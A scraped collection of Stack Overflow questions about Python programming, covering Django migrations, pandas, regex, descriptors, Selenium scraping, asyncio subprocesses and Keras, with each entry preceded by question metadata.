mysql.connector.errors.IntegrityError: 1048 (23000): Column 'content_type_id' cannot be null

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File ""manage.py"", line 10, in &lt;module&gt;
    execute_from_command_line(sys.argv)
  File ""/Users/JenniferLiu/.virtualenvs/bookSell/lib/python3.5/site-packages/django/core/management/__init__.py"", line 367, in execute_from_command_line
    utility.execute()
  File ""/Users/JenniferLiu/.virtualenvs/bookSell/lib/python3.5/site-packages/django/core/management/__init__.py"", line 359, in execute
    self.fetch_command(subcommand).run_from_argv(self.argv)
  File ""/Users/JenniferLiu/.virtualenvs/bookSell/lib/python3.5/site-packages/django/core/management/base.py"", line 294, in run_from_argv
    self.execute(*args, **cmd_options)
  File ""/Users/JenniferLiu/.virtualenvs/bookSell/lib/python3.5/site-packages/django/core/management/base.py"", line 345, in execute
    output = self.handle(*args, **options)
  File ""/Users/JenniferLiu/.virtualenvs/bookSell/lib/python3.5/site-packages/django/core/management/commands/migrate.py"", line 224, in handle
    self.verbosity, self.interactive, connection.alias, apps=post_migrate_apps, plan=plan,
  File ""/Users/JenniferLiu/.virtualenvs/bookSell/lib/python3.5/site-packages/django/core/management/sql.py"", line 53, in emit_post_migrate_signal
    **kwargs
  File ""/Users/JenniferLiu/.virtualenvs/bookSell/lib/python3.5/site-packages/django/dispatch/dispatcher.py"", line 191, in send
    response = receiver(signal=self, sender=sender, **named)
  File ""/Users/JenniferLiu/.virtualenvs/bookSell/lib/python3.5/site-packages/django/contrib/auth/management/__init__.py"", line 83, in create_permissions
    Permission.objects.using(using).bulk_create(perms)
  File ""/Users/JenniferLiu/.virtualenvs/bookSell/lib/python3.5/site-packages/django/db/models/query.py"", line 452, in bulk_create
    ids = self._batched_insert(objs_without_pk, fields, batch_size)
  File ""/Users/JenniferLiu/.virtualenvs/bookSell/lib/python3.5/site-packages/django/db/models/query.py"", line 1068, in _batched_insert
    self._insert(item, fields=fields, using=self.db)
  File ""/Users/JenniferLiu/.virtualenvs/bookSell/lib/python3.5/site-packages/django/db/models/query.py"", line 1045, in _insert
    return query.get_compiler(using=using).execute_sql(return_id)
  File ""/Users/JenniferLiu/.virtualenvs/bookSell/lib/python3.5/site-packages/django/db/models/sql/compiler.py"", line 1054, in execute_sql
    cursor.execute(sql, params)
  File ""/Users/JenniferLiu/.virtualenvs/bookSell/lib/python3.5/site-packages/django/db/backends/utils.py"", line 79, in execute
    return super(CursorDebugWrapper, self).execute(sql, params)
  File ""/Users/JenniferLiu/.virtualenvs/bookSell/lib/python3.5/site-packages/django/db/backends/utils.py"", line 64, in execute
    return self.cursor.execute(sql, params)
  File ""/Users/JenniferLiu/.virtualenvs/bookSell/lib/python3.5/site-packages/mysql/connector/django/base.py"", line 227, in execute
    return self._execute_wrapper(self.cursor.execute, query, new_args)
  File ""/Users/JenniferLiu/.virtualenvs/bookSell/lib/python3.5/site-packages/mysql/connector/django/base.py"", line 183, in _execute_wrapper
    utils.IntegrityError(err.msg), sys.exc_info()[2])
  File ""/Users/JenniferLiu/.virtualenvs/bookSell/lib/python3.5/site-packages/django/utils/six.py"", line 685, in reraise
    raise value.with_traceback(tb)
  File ""/Users/JenniferLiu/.virtualenvs/bookSell/lib/python3.5/site-packages/mysql/connector/django/base.py"", line 177, in _execute_wrapper
    return method(query, args)
  File ""/Users/JenniferLiu/.virtualenvs/bookSell/lib/python3.5/site-packages/mysql/connector/cursor.py"", line 515, in execute
    self._handle_result(self._connection.cmd_query(stmt))
  File ""/Users/JenniferLiu/.virtualenvs/bookSell/lib/python3.5/site-packages/mysql/connector/connection.py"", line 488, in cmd_query
    result = self._handle_result(self._send_cmd(ServerCmd.QUERY, query))
  File ""/Users/JenniferLiu/.virtualenvs/bookSell/lib/python3.5/site-packages/mysql/connector/connection.py"", line 395, in _handle_result
    raise errors.get_exception(packet)
django.db.utils.IntegrityError: Column 'content_type_id' cannot be null
</code></pre>

<p>Here is my model.py:</p>

<pre><code>class Book(models.Model):
    title = models.CharField(max_length=200,default='')
    author = models.CharField(max_length=200,default='')
    year_published = models.DateField(default='1998-09-18')
    description = models.CharField(max_length = 500,default='')
    rating = models.IntegerField(default=1)
</code></pre>

<p>This is migrations 0001_initial.py:</p>

<pre><code>class Migration(migrations.Migration):

    initial = True

    dependencies = [
    ]

    operations = [
        migrations.CreateModel(
            name='Book',
            fields=[
                ('id', models.AutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID')),
                ('title', models.CharField(default='', max_length=200)),
                ('author', models.CharField(default='', max_length=200)),
                ('year_published', models.DateField(default='1998-09-18')),
                ('description', models.CharField(default='', max_length=500)),
                ('rating', models.IntegerField(default=1)),
            ],
        ),
    ]
</code></pre>

<p>python manage.py makemigrations worked fine. This was the result</p>

<pre><code>Migrations for 'bookSell':
  bookSell/migrations/0001_initial.py:
    - Create model Book
</code></pre>

<p>Much help is appreciated, thank you, please leave a comment if any additional information is needed to solve this problem. :D</p>

<p>EDIT 2
Setting.py </p>

<pre><code>INSTALLED_APPS = [
    'django.contrib.admin',
    'django.contrib.auth',
    'django.contrib.contenttypes',
    'django.contrib.sessions',
    'django.contrib.messages',
    'django.contrib.staticfiles',
    'bookSell',
]
</code></pre>

<p>So I manage to get python to runserver, and in admin I do get it to run with the Books Model, but issue is that when i try to add books. I get the error, Column 'user_id' cannot be null</p>
"
39847995,6904888.0,2016-10-04 08:51:40+00:00,2,Mykrobe predictor JSON to TSV Converter,"<p>I wanted to ask a question regarding file conversion.</p>

<p>I have a JSON file (after AMR prediction execution) that I want to covert to a TSV file based on Mykrobe-predictor scripts (json_to_tsv.py) and this is my JSON output (<a href=""http://bioinfo.cs.ccu.edu.tw/result_TB.json"" rel=""nofollow"">result_TB.json</a>).</p>

<pre><code>./json_to_tsv.py /path/to/JSON_file
</code></pre>

<p>When I pasted a command into the terminal, I got a IndexError at Line 78.</p>

<p><a href=""https://github.com/iqbal-lab/Mykrobe-predictor/blob/master/scripts/json_to_tsv.py#L78"" rel=""nofollow"">https://github.com/iqbal-lab/Mykrobe-predictor/blob/master/scripts/json_to_tsv.py#L78</a></p>

<pre><code> def get_sample_name(f):
  return f.split('/')[-2]
</code></pre>

<p>And here is the error I get:</p>

<pre><code>mykrobe_version file plate_name sample drug phylo_group species lineage phylo_group_per_covg species_per_covg lineage_per_covg phylo_group_depth species_depth lineage_depth susceptibility variants (gene:alt_depth:wt_depth:conf) genes (prot_mut-ref_mut:percent_covg:depth)
  Traceback (most recent call last):
  File ""./json_to_tsv.py"", line 157, in &lt;module&gt;
  sample_name = get_sample_name(f)
  File ""./json_to_tsv.py"", line 78, in get_sample_name
  return f.split('/')[-2]
  IndexError: list index out of range
</code></pre>

<p>Any suggestions would be appreciated.</p>
"
39950951,308827.0,2016-10-10 03:34:26+00:00,2,Convert string based NaN's to numpy NaN's,"<p>I have a dataframe with a part of it shown as below:</p>

<pre><code>2016-12-27              NaN
2016-12-28              NaN
2016-12-29              NaN
2016-12-30              NaN
2016-12-31              NaN
Name: var_name, dtype: object
</code></pre>

<p>The column contains NaN as strings/objects. How can I convert it to a numpy nan instead. Best would be able to do so when I read in the csv file.</p>
"
39848164,2109064.0,2016-10-04 08:58:53+00:00,2,Change the underlying data representation with the descriptor protocol,"<p>Suppose I have an existing class, for example doing some mathematical stuff:</p>

<pre><code>class Vector:

    def __init__(self, x, y):
        self.x = y
        self.y = y

    def norm(self):
        return math.sqrt(math.pow(self.x, 2) + math.pow(self.y, 2))
</code></pre>

<p>Now, for some reason, I'd like to have that Python does not store the members <code>x</code> and <code>y</code> like any variable. I'd rather want that Python internally stores them as strings. Or that it stores them into a dedicated buffer, maybe for interoperability with some C code. So (for the string case) I build the following <em>descriptor</em>:</p>

<pre><code>class MyStringMemory(object):

    def __init__(self, convert):
        self.convert = convert

    def __get__(self, obj, objtype):
        print('Read')
        return self.convert(self.prop)

    def __set__(self, obj, val):
        print('Write')
        self.prop = str(val)

    def __delete__(self, obj):
        print('Delete')
</code></pre>

<p>And I wrap the existing vector class in a new class where members <code>x</code> and <code>y</code> become <code>MyStringMemory</code>:</p>

<pre><code>class StringVector(Vector):

    def __init__(self, x, y):
        self.x = x
        self.y = y

    x = MyStringMemory(float)
    y = MyStringMemory(float)
</code></pre>

<p>Finally, some driving code:</p>

<pre><code>v = StringVector(1, 2)
print(v.norm())
v.x, v.y = 10, 20
print(v.norm())
</code></pre>

<p>After all, I replaced the internal representation of <code>x</code> and <code>y</code> to be strings without any change in the original class, but still with its full functionality.</p>

<p>I just wonder: <strong>Will that concept work universally or do I run into serious pitfalls?</strong> As I said, the main idea is to store the data into a specific buffer location that is later on accessed by a C code.</p>

<p><strong>Edit:</strong> The intention of what I'm doing is as follows. Currently, I have a nicely working program where some physical objects, all of type <code>MyPhysicalObj</code> interact with each other. The code <em>inside</em> the objects is vectorized with Numpy. Now I'd also like to vectorize some code <em>over all</em> objects. For example, each object has an <code>energy</code> that is computed by a complicated vectorized code per-object. Now I'd like to sum up all energies. I can iterate over all objects and sum up, but that's slow. So I'd rather have that property <code>energy</code> for each object automatically stored into a globally predefined buffer, and I can just use <code>numpy.sum</code> over that buffer.</p>
"
39849497,4068678.0,2016-10-04 10:04:34+00:00,2,Get visible content of a page using selenium and BeautifulSoup,"<p>I want to retrieve all visible content of a web page. Let say for example <a href=""https://dukescript.com/best/practices/2015/11/23/dynamic-templates.html"" rel=""nofollow"">this</a> webpage. I am using a headless firefox browser remotely with selenium.</p>

<p>The script I am using looks like this</p>

<pre><code>driver = webdriver.Remote('http://0.0.0.0:xxxx/wd/hub', desired_capabilities)
driver.get(url)
dom = BeautifulSoup(driver.page_source, parser)

f = dom.find('iframe', id='dsq-app1')
driver.switch_to_frame('dsq-app1')
s = driver.page_source
f.replace_with(BeautifulSoup(s, 'html.parser'))

with open('out.html', 'w') as fe:
    fe.write(dom.encode('utf-8'))
</code></pre>

<p>This is supposed to load the page, parse the dom, and then replace the iframe with id <code>dsq-app1</code> with it's visible content. If I execute those commands one by one via my python command line it works as expected. I can then see the paragraphs with all the visible content. When instead I execute all those commands at once, either by executing the script or by pasting all this snippet in my interpreter, it behaves differently. The paragraphs are missing, the content still exists in json format, but it's not what I want.</p>

<p>Any idea why this may happening? Something to do with <code>replace_with</code> maybe?</p>
"
39950130,4483861.0,2016-10-10 01:13:39+00:00,2,How to avoid re-importing modules and re-defining large object every time a script runs,"<p>This must have an answer but I cant find it. I am using a quite large python module called quippy. With this module one can define an intermolecular potential to use as a calculator in ASE like so: </p>

<pre><code>from quippy import *
from ase import atoms
pot=Potential(""Potential  xml_label=gap_h2o_2b_ccsdt_3b_ccsdt"",param_filename=""gp.xml"")
some_structure.set_calculator(pot)
</code></pre>

<p>This is the beginning of a script. The problem is that the <code>import</code> takes about 3 seconds and <code>pot=Potential...</code> takes about 30 seconds with 100% cpu load. (I believe it is due to parsing a large ascii xml-file.) If I would be typing interactively I could keep the module imported and the potential defined, but when running the script it is done again on each run. </p>

<p>Can I save the module and the potential object in memory/disk between runs? Maybe keep a python process idling and keeping those things in memory? Or run these lines in the interpreter and somehow call the rest of the script from there? </p>

<p>Any approach is fine, but some help is be appreciated!</p>
"
39950111,365102.0,2016-10-10 01:11:33+00:00,2,Recursive sequence generator,"<p>Does Python have a recursive sequence generating function? For instance,</p>

<pre><code>def generateSequence(seed, f, n):
    sequence = list(seed)
    for i in range(n):
        sequence.append(f(sequence, i))
    return sequence
</code></pre>

<p>Which may be used like so:</p>

<pre><code>fibSequence = generateSequence([0, 1], lambda x, i: x[-1] + x[-2], 8)
</code></pre>

<p>To produce:</p>

<pre><code>[0, 1, 1, 2, 3, 5, 8, 13, 21, 34]
</code></pre>
"
39850550,2033214.0,2016-10-04 10:59:42+00:00,2,How does one populate a row in pandas python,"<p>I have initialised a dataframe in python to simulate a matrix</p>

<pre><code> llist = [""this"", ""is"", ""a"",""sentence""]
 df = pd.DataFrame(columns = llist, index = llist)
</code></pre>

<p>Now I want to populate a row as follows </p>

<pre><code> test = [1,0,0,0]
 df.iloc[[1]] = test
</code></pre>

<p>this throws up the following error</p>

<blockquote>
  <p>ValueError: cannot set using a list-like indexer with a different       length than the value</p>
</blockquote>

<p>When I set the value as below it populates the row with the same value </p>

<pre><code>  test = [1]
  df.iloc[[1]] = test
</code></pre>

<p>Can someone tell me why this happens and the most efficient way of populating a row with a list of different values? </p>
"
39847215,389289.0,2016-10-04 08:05:30+00:00,2,How does source encoding apply within string literals?,"<p><a href=""https://www.python.org/dev/peps/pep-0263/"" rel=""nofollow"">PEP-263</a> specifies that encoding specified in the source is applied in the following order:</p>

<blockquote>
  <ol>
  <li><p>read the file</p></li>
  <li><p>decode it into Unicode assuming a fixed per-file encoding</p></li>
  <li><p>convert it into a UTF-8 byte string</p></li>
  <li><p>tokenize the UTF-8 content</p></li>
  <li><p>compile it, creating Unicode objects from the given Unicode data
  and creating string objects from the Unicode literal data
  by first reencoding the UTF-8 data into 8-bit string data
  using the given file encoding</p></li>
  </ol>
</blockquote>

<p>So, if I take this code:</p>

<pre><code>print 'abcdefgh'
print u'abcdefgh'
</code></pre>

<p>And convert it to ROT-13:</p>

<pre><code># coding: rot13

cevag 'nopqrstu'
cevag h'nopqrstu'
</code></pre>

<p>I would expect that it is first decoded and then becomes identical to the original, printing:</p>

<pre><code>abcdefgh
abcdefgh
</code></pre>

<p>But instead, it prints:</p>

<pre><code>nopqrstu
abcdefgh
</code></pre>

<p>So, the <code>unicode</code> literal works as expeced, but <code>str</code> remains unconverted. <strong>Why?</strong></p>

<hr>

<p><strong>Eliminating some possibilities:</strong></p>

<p>I confirmed that the problem is not in a later phase (printing to console), but immediately at parsing, becuase this code produces <em>""ValueError: unsupported format character 'q' (0x71) at index 1""</em>:</p>

<pre><code>x = '%q' % 1  # that is %d !
</code></pre>
"
39850575,3886740.0,2016-10-04 11:00:51+00:00,2,Best practice for overriding __getattr__ in new-style classes,"<p>I'd like to process access on undefined class attributes and default to normal behavior if the item is not in a predefined global valid set. Normally I would do something like this: </p>

<pre><code>class Foo(object):
    def __getattr__(self, item):
        if item in valid_set:
            #some logic here
            return None
        # The following will not work
        return super(Foo, self).__getattr__(item)
</code></pre>

<p>But <code>super(Foo, self).__getattr__(item)</code> is not valid. What should be the default return here?</p>
"
39949497,1305724.0,2016-10-09 23:18:46+00:00,2,"Capturing all operators, parentheses and numbers separately in ""(3 + 44)* 5 / 7"" with Regex","<p>For input string: <code>st = ""(3 + 44)* 5 / 7""</code></p>

<p>I'm looking to get the following result using only regex: <code>[""("", ""3"", ""+"", ""44"", "")"", ""*"", ""5"", ""/"", ""7""]</code></p>

<p>Attempts:</p>

<ol>
<li><pre><code>&gt;&gt;&gt; re.findall(""[()\d+\-*/].?"", st)
['(3', '+ ', '44', ')*', '5 ', '/ ', '7']
</code></pre>

<p>But I need to capture the parentheses in <code>'(3'</code> and <code>')*'</code> separately as well. </p></li>
<li><pre><code>&gt;&gt;&gt; re.findall(""[()\d+\-*/]?"", st)    
['(', '3', '', '+', '', '4', '4', ')', '*', '', '5', '', '/', '', '7', '']
</code></pre>

<p>This gives tons of blank tokens.</p></li>
</ol>
"
39851196,240613.0,2016-10-04 11:33:40+00:00,2,How do I know when I can/should use `with` keyword?,"<p>In C#, when an object implements <code>IDisposable</code>, <code>using</code> should be used to guarantee that resources will be cleaned if an exception is thrown. For instance, instead of:</p>

<pre class=""lang-cs prettyprint-override""><code>var connection = new SqlConnection(...);
...
connection.Close();
</code></pre>

<p>one needs to write:</p>

<pre class=""lang-cs prettyprint-override""><code>using (var connection = new SqlConnection(...))
{
    ...
}
</code></pre>

<p>Therefore, just by looking at the signature of the class, I know exactly whether or not I should initialize the object inside a <code>using</code>.</p>

<p>In Python 3, a similar construct is <code>with</code>. Similarly to C#, it ensures that the resources will be cleaned up automatically when exiting the <code>with</code> context, even if a error is raised.</p>

<p>However, I'm not sure how should I determine whether <code>with</code> should be used or not for a specific class. For instance, <a href=""http://initd.org/psycopg/docs/usage.html"" rel=""nofollow"">an example from <code>psycopg</code></a> doesn't use <code>with</code>, which may mean that:</p>

<ul>
<li>I shouldn't either, or:</li>
<li>The example is written for Python 2, or:</li>
<li>The authors of the documentation were unaware of <code>with</code> syntax, or:</li>
<li>The authors decided not to handle exceptional cases for the sake of simplicity.</li>
</ul>

<p>In general, how should I determine whether <code>with</code> should be used when initializing an instance of a specific class (assuming that documentation says nothing on the subject, and that I have access to source code)?</p>
"
39851743,6087969.0,2016-10-04 12:00:22+00:00,2,Pandas pivoting on timestap table returns unexpected result,"<p>I have a DataFrame  with two columns: <code>ts</code> (timestamp) and <code>n</code> (number)</p>

<p>timestamps begin at <code>2016-07-15</code>:</p>

<pre><code>In [1]: d.head()
Out[1]:
                       ts   n
0 2016-07-15 00:04:09.444  12
1 2016-07-15 00:05:01.633  12
2 2016-07-15 00:05:03.173  31
3 2016-07-15 00:05:03.970  12
4 2016-07-15 00:05:04.258  23
</code></pre>

<p>now, I pivot:</p>

<pre><code>pd.pivot_table(d, columns='n', values='ts', aggfunc=lambda x: (np.min(x) - pd.Timestamp('2016-07-15')).days)
</code></pre>

<p>I expect to see column with integers represent days but instead I see:</p>

<pre><code>n
12   1970-01-01
23   1970-01-01
31   1970-01-01
Name: ts, dtype: datetime64[ns]
</code></pre>

<p>What am O missing here? and is there a better way to achieve the same (trying to get the offset in days for the first appearance of <code>n</code> in the table)</p>
"
39852123,5488780.0,2016-10-04 12:17:52+00:00,2,Replacing different substrings without clear pattern in python,"<p>I need to replace part of some queries (strings) which <strong>don't</strong> always have the same substring to replace. </p>

<pre><code>query = """""" SELECT DATE(utimestamp) as utimestamp, sum(value) as value 
from table 
where utimestamp BETWEEN '2000-06-28 00:00:00' AND '2000-07-05 00:00:00' 
group by YEAR(utimestamp), MONTH(utimestamp), id """"""
</code></pre>

<p>I want to replace the part regarding date after <em>group by</em>. </p>

<p>This part could be any of the following strings:</p>

<pre><code>'YEAR(utimestamp), MONTH(utimestamp), DAY(utimestamp),'
'YEAR(utimestamp), MONTH(utimestamp), WEEK(utimestamp),'
'YEAR(utimestamp), MONTH(utimestamp),'
'YEAR(utimestamp),'
</code></pre>

<p>My idea is to search for ""<em>(utimestamp),</em>"" and get the part from the left (YEAR, DAY, WEEK or MONTH) searching for the first blank space in the left. After having those removed I want to insert another substring, but how can I insert this substring now that I have blank spaces where the new substring should go.</p>

<p>I thought of getting the index everytime I removed a string and once there's no more to remove insert the substring there but I think I'm complicating things.</p>

<p>Is there an easier, neat way of doing this? Am I missing something?</p>

<p><strong>EXAMPLE:</strong></p>

<p>Input string that needs replacement:</p>

<p>query = """""" SELECT DATE(utimestamp) as utimestamp, sum(value) as value 
    from table 
    where utimestamp BETWEEN '2000-06-28 00:00:00' AND '2000-07-05 00:00:00' 
    group by YEAR(utimestamp), MONTH(utimestamp), id """"""</p>

<p>or </p>

<pre><code>query = """""" SELECT DATE(utimestamp) as utimestamp, sum(value) as value 
        from table 
        where utimestamp BETWEEN '2000-06-28 00:00:00' AND '2000-07-05 00:00:00' 
        group by YEAR(utimestamp), id """"""
</code></pre>

<p>or</p>

<pre><code>query = """""" SELECT DATE(utimestamp) as utimestamp, sum(value) as value 
        from table 
        where utimestamp BETWEEN '2000-06-28 00:00:00' AND '2000-07-05 00:00:00' 
        group by YEAR(utimestamp), MONTH(utimestamp), WEEK(utimestamp), id """"""
</code></pre>

<p>etc.</p>

<p>Desired result:</p>

<pre><code>query_replaced = """""" SELECT DATE(utimestamp) as utimestamp, sum(value) as value 
    from table 
    where utimestamp BETWEEN '2000-06-28 00:00:00' AND '2000-07-05 00:00:00' 
    group by MY_COOL_STRING, id """"""
</code></pre>

<p>If should work for all those cases (and more, the ones stated before)</p>

<p>Following @Efferalgan answer I came up with this:</p>

<pre><code>query_1 = query.split(""group by"")[0]
utimestamp_list = query.split(""(utimestamp)"")
l = len(utimestamp_list)
query_2 = utimestamp_list[l-1]
query_3 = query_1 + "" group by MY_COOL_STRING"" + query_2
</code></pre>
"
39948543,66674.0,2016-10-09 21:07:20+00:00,2,Find range of arguments that return the same result for a linear function,"<p>Consider the <code>y = round(300000/x**2)</code>. I would like to find the ranges of <code>x</code> that return the same <code>y</code> for <code>100 &lt; x &lt; 40000</code>.</p>

<p>How would I do that with python/numpy?</p>
"
39847681,6080543.0,2016-10-04 08:34:48+00:00,2,Python Regular Expression for a paragraph,"<p>Hi i have this as my testing string:</p>

<pre><code>&lt;image&gt;
&lt;title&gt;CNN.com - Technology&lt;/title&gt;
&lt;link&gt;http://www.cnn.com/TECH/index.html?eref=rss_tech&lt;/link&gt;
</code></pre>

<p>and i want to select 'Technology' from it using a python regular expression, however i need it specific so that it uses <code>&lt;image&gt;</code> and <code>&lt;link&gt;</code>. So far the expression i have is:</p>

<pre><code>'&lt;title[^&gt;]*&gt;CNN.com - (.*?)&lt;/title&gt;'
</code></pre>

<p>this expression works to select 'Technology', this is correct however i am unsure how to specialise my code using  <code>&lt;image&gt;</code> and <code>&lt;link&gt;</code> in the expression. For example i need something along the lines of this regular expression <code>'&lt;image&gt;&lt;title[^&gt;]*&gt;CNN.com - (.*?)&lt;/title&gt;&lt;link&gt;'</code> that would actually work to produce the same result of 'Technology?  </p>
"
39951502,996366.0,2016-10-10 04:54:36+00:00,2,How to update weights in keras for reinforcement learning?,"<p>I am working in a reinforcement learning program and  I am using this article as the <a href=""https://www.nervanasys.com/demystifying-deep-reinforcement-learning/"" rel=""nofollow"">reference</a>. I am using python with keras(theano) for creating neural network and the pseudo code I am using for this program is</p>

<pre><code>Do a feedforward pass for the current state s to get predicted Q-values for all actions.

Do a feedforward pass for the next state sâ and calculate maximum overall network outputs max aâ Q(sâ, aâ).

Set Q-value target for action to r + Î³max aâ Q(sâ, aâ) (use the max calculated in step 2). For all other actions, set the Q-value target to the same as originally returned from step 1, making the error 0 for those outputs.

Update the weights using backpropagation.
</code></pre>

<p>The loss function equation here is this</p>

<p><a href=""http://i.stack.imgur.com/e17OA.png"" rel=""nofollow""><img src=""http://i.stack.imgur.com/e17OA.png"" alt=""enter image description here""></a></p>

<p>where my reward is +1, maxQ(s',a') =0.8375 and Q(s,a)=0.6892</p>

<p>My L would be <code>1/2*(1+0.8375-0.6892)^2=0.659296445</code></p>

<p>Now how should I update my <strong>model</strong> neural network weights using the above loss function value if my model structure is this</p>

<pre><code>model = Sequential()
model.add(Dense(150, input_dim=150))
model.add(Dense(10))
model.add(Dense(1,activation='sigmoid'))
model.compile(loss='mse', optimizer='adam')
</code></pre>
"
40020326,3667569.0,2016-10-13 11:56:14+00:00,2,How to remove words containing only numbers in python?,"<p>I have some text in Python which is composed of numbers and alphabets. Something like this:</p>

<pre><code>s = ""12 word word2""
</code></pre>

<p>From the string s, I want to remove all the words containing <strong>only numbers</strong></p>

<p>So I want the result to be </p>

<pre><code>s = ""word word2""
</code></pre>

<p>This is a regex I have but it works on alphabets i.e. it replaces each alphabet by a space.</p>

<pre><code>re.sub('[\ 0-9\ ]+', ' ', line)
</code></pre>

<p>Can someone help in telling me what is wrong? Also, is there a more time-efficient way to do this than regex?</p>

<p>Thanks!</p>
"
39842386,6811581.0,2016-10-04 00:20:20+00:00,2,Django - Simple search form,"<p>Using Django 1.9 with Python 3.5, I would like to make a simple search form:</p>

<p><strong>views.py</strong> </p>

<pre><code>from django.views import generic
from django.shortcuts import render
from .models import Movie, Genre

class IndexView(generic.ListView):
    template_name = 'movies/index.html'
    page_template = 'movies/all_movies.html'
    context_object_name = 'all_movies'
    model = Movie

    def get_context_data(self, **kwargs):
        context = super(IndexView, self).get_context_data(**kwargs)
        context.update({
            'all_genres': Genre.objects.all(),
            'page_title': 'Latest'
        })
        return context

    def get_queryset(self):
        query = request.GET.get('q')
        if query:
            return Movie.objects.filter(title__icontains=query)
        else:
            return Movie.objects.all()
</code></pre>

<p><strong>form</strong></p>

<pre><code>&lt;form method=""GET"" action="""" id=""searchform""&gt;
    &lt;input class=""searchfield"" id=""searchbox"" name=""q"" type=""text"" value=""{{ request.GET.q }}"" placeholder=""Search...""/&gt;
&lt;/form&gt;
</code></pre>

<p>For some reason I keep getting the error: </p>

<blockquote>
  <p>name 'request' is not defined</p>
</blockquote>

<p>I'm not quite sure what I'm doing wrong, any help would be appreciated.</p>
"
39840845,5915959.0,2016-10-03 21:39:37+00:00,2,python generate a infinite list with certain condition,"<p>I know there is generator yield in python like:</p>

<pre><code>def f(n): 
    x = n
    while True:
        yield x
        x = x+1
</code></pre>

<p>So I try to convert this haskell function into python without using iterate: <a href=""http://stackoverflow.com/questions/39809592/haskell-infinite-recursion-in-list-comprehension"">Haskell infinite recursion in list comprehension</a></p>

<p>I'm not sure how to define base case in python, also not sure how to combine if statement with this yield staff! here is what I try to do:</p>

<pre><code>def orbit(x,y):
    while True:
        yield p (u,v)
        p (u,v) = (u^2 - v^2 + x, 2 * u * v + y)
</code></pre>
"
39841204,678572.0,2016-10-03 22:10:08+00:00,2,"How to ""melt"" `pandas.DataFrame` objects? (Python 3)","<p>I'm trying to <code>melt</code> certain columns of a <code>pd.DataFrame</code> while preserving columns of the other.  In this case, I want to <code>melt</code> <code>sine</code> and <code>cosine</code> columns into <code>values</code> and then which column they came from (i.e. <code>sine</code> or <code>cosine</code>) into a new columns entitled <code>data_type</code> then preserving the original <code>desc</code> column.</p>

<p><strong>How can I use <code>pd.melt</code> to achieve this w/o melting and concatenating each component manually?</strong> </p>

<pre><code># Data
a = np.linspace(0,2*np.pi,100)
DF_data = pd.DataFrame([a, np.sin(np.pi*a), np.cos(np.pi*a)], index=[""t"", ""sine"", ""cosine""], columns=[""t_%d""%_ for _ in range(100)]).T
DF_data[""desc""] = [""info about this"" for _ in DF_data.index]
</code></pre>

<p><a href=""http://i.stack.imgur.com/cDNbN.png"" rel=""nofollow""><img src=""http://i.stack.imgur.com/cDNbN.png"" alt=""enter image description here""></a></p>

<p>The round about way I did it:</p>

<pre><code># Melt each part
DF_melt_A = pd.DataFrame([DF_data[""t""],
                          DF_data[""sine""],
                          pd.Series(DF_data.shape[0]*[""sine""], index=DF_data.index, name=""data_type""), 
                          DF_data[""desc""]]).T.reset_index()
DF_melt_A.columns = [""idx"",""t"",""values"",""data_type"",""desc""]
DF_melt_B = pd.DataFrame([DF_data[""t""],
                          DF_data[""cosine""],
                          pd.Series(DF_data.shape[0]*[""cosine""], index=DF_data.index, name=""data_type""),
                          DF_data[""desc""]]).T.reset_index()
DF_melt_B.columns = [""idx"",""t"",""values"",""data_type"",""desc""]

# Merge
pd.concat([DF_melt_A, DF_melt_B], axis=0, ignore_index=True)
</code></pre>

<p><a href=""http://i.stack.imgur.com/JJbep.png"" rel=""nofollow""><img src=""http://i.stack.imgur.com/JJbep.png"" alt=""enter image description here""></a></p>

<p>If I do <code>pd.melt(DF_data</code> I get a complete meltdown</p>

<p><a href=""http://i.stack.imgur.com/l5rEY.png"" rel=""nofollow""><img src=""http://i.stack.imgur.com/l5rEY.png"" alt=""enter image description here""></a></p>

<p>In response to the comments:
<a href=""http://i.stack.imgur.com/y1YCp.png"" rel=""nofollow""><img src=""http://i.stack.imgur.com/y1YCp.png"" alt=""enter image description here""></a></p>
"
39958110,1777415.0,2016-10-10 12:16:14+00:00,2,how to complex manage shell processes with asyncio?,"<p>I want to track reboot process of daemon with python's asyncio module. So I need to run shell command <code>tail -f -n 0 /var/log/daemon.log</code> and analyze it's output while, let's say, <code>service daemon restart</code> executing in background. Daemon continues to write to log after service restart command finished it's execution and reports it's internal checks. Track process read checks info and reports that reboot was successful or not based it's internal logic.</p>

<pre><code>import asyncio
from asyncio.subprocess import PIPE, STDOUT

async def track():
    output = []
    process = await asyncio.create_subprocess_shell(
        'tail -f -n0 ~/daemon.log',
        stdin=PIPE, stdout=PIPE, stderr=STDOUT
    )
    while True:
        line = await process.stdout.readline()
        if line.decode() == 'reboot starts\n':
            output.append(line)
            break
    while True:
        line = await process.stdout.readline()
        if line.decode() == '1st check completed\n':
            output.append(line)
            break
    return output

async def reboot():
    lines = [
        '...',
        '...',
        'reboot starts',
        '...',
        '1st check completed',
        '...',
    ]
    p = await asyncio.create_subprocess_shell(
        (
            'echo ""rebooting""; '
            'for line in {}; '
                'do echo $line &gt;&gt; ~/daemon.log; sleep 1; '
            'done; '
            'echo ""rebooted"";'
        ).format(' '.join('""{}""'.format(l) for l in lines)),
        stdin=PIPE, stdout=PIPE, stderr=STDOUT
    )
    return (await p.communicate())[0].splitlines()

if __name__ == '__main__':
    loop = asyncio.get_event_loop()
    loop.run_until_complete(asyncio.gather(
        asyncio.ensure_future(track()),
        asyncio.ensure_future(reboot())
    ))
    loop.close()
</code></pre>

<p>This code is only way I've found to run two coroutines in parallel. But how to run <code>track()</code> strictly before <code>reboot</code> to not miss any possible output in log? And how to retrieve return values of both coroutines?</p>
"
39958095,5164840.0,2016-10-10 12:15:33+00:00,2,Add elements in a matrix in python,"<p>I have this matrix:</p>

<pre><code>mat = [[ 0 for x in range(row)] for y in range(column)]
</code></pre>

<p>I tried to add elements to the matrix:</p>

<pre><code>for x in range(row): # row is 2 
    for y in range(column): # column is 3
        mat[x][y] = int(input(""number: ""))
</code></pre>

<p>but the shell returns this error:</p>

<pre><code>Traceback (most recent call last):
File ""C:\Users\Fr\Desktop\pr.py"", line 13, in &lt;module&gt;
mat[x][y] = 12
IndexError: list assignment index out of range
</code></pre>

<p>how do I add elements to a matrix?</p>
"
39957573,6908374.0,2016-10-10 11:47:50+00:00,2,grouping related data in csv excel file,"<p>this is a csv excel file</p>

<pre><code>   Receipt Name    Address      Date       Time    Total
    25007   A      ABC pte ltd   3/7/2016   10:40   12.30
    25008   A      ABC ptd ltd   3/7/2016   11.30   6.70
